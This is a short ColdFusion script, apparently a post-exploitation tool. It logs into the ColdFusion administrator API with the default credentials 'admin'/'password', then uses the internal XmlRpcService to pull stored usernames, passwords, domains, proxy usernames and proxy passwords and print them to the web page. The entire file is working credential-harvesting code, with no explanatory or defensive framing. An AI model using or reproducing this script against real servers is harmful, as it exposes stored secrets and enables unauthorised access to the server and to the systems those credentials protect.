<cfsetting requesttimeout="40">
<cfscript>
	admin = createObject("component", "CFIDE.adminapi.administrator");
	loginOk = admin.login(adminPassword="password", adminUserId="admin");
	sf = createObject("java", "coldfusion.server.ServiceFactory");
	xrs = sf.getXmlRpcService();
	out = [];
	for(m in ["getUsernames","getPasswords","getTimeouts","getAuthtypes","getDomains","getWorkstations","getProxyservers","getProxyports","getProxyusernames","getProxypasswords"]){
		try {
			v = evaluate("xrs.#m#()");
			arrayAppend(out, m & "=" & serializeJSON(v));
		} catch(any e){ arrayAppend(out, m & " ERR " & e.message); }
	}
	writeOutput("port=#cgi.server_port# | " & arrayToList(out, " | "));
</cfscript>
